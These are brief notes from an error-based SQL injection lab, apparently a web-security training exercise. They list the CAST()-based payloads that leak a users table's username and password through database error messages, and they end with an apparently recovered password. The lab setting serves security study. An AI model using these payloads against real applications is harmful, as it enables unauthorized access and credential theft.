Lab #18 – Visible error-based SQL injection

End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.

Analysis:

select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''

SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char


CAST()


pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--

' AND 1=CAST((SELECT username from users LIMIT 1) as int)--

' AND 1=CAST((SELECT password from users LIMIT 1) as int)--

fc9v2vqq5gozv1cb0ibj